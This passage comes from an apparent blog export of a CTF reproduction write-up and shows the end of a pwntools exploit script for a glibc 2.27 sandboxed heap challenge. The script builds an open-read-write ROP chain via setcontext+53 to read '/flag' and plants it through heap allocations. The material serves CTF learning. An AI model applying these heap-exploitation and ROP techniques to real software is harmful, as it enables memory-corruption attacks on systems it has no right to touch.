libc_base+libc.sym.setcontext+<span class="number">53</span></span><br><span class="line">    read = libc_base+libc.sym.read</span><br><span class="line">    write = libc_base+libc.sym.write</span><br><span class="line">    flag = heap_addr+<span class="number">0x1000</span></span><br><span class="line">    get_flag = heap_addr+<span class="number">0x3000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># [+] ====== O R W ========== [+]</span></span><br><span class="line">    o = p64(rdi)+p64(flag)</span><br><span class="line">    o += p64(rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    o += p64(rax)+p64(<span class="number">2</span>)</span><br><span class="line">    o += p64(syscall)</span><br><span class="line"></span><br><span class="line">    r = p64(rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    r += p64(rsi)+p64(get_flag)</span><br><span class="line">    r += p64(rdx)+p64(<span class="number">0x100</span>)</span><br><span class="line">    r += p64(read)</span><br><span class="line"></span><br><span class="line">    w = p64(rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    w += p64(write)</span><br><span class="line">    </span><br><span class="line">    orw = o+r+w</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;setcontext&quot;</span>,setcontext)</span><br><span class="line">    add(<span class="number">0x18</span>)</span><br><span class="line">    edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x38</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>)</span><br><span class="line">    edit(orw[:<span class="number">0x60</span>])    <span class="comment"># orw1</span></span><br><span class="line">    add(<span class="number">0x78</span>) </span><br><span class="line">    edit(orw[<span class="number">0x60</span>:])    <span class="comment"># orw2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>)</span><br><span class="line">    edit(p64(heap_addr+<span class="number">0x3000</span>)+p64(ret))</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    delete()</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#bug()</span></span><br><span class="line">exp()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap_sandbox-2.27 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
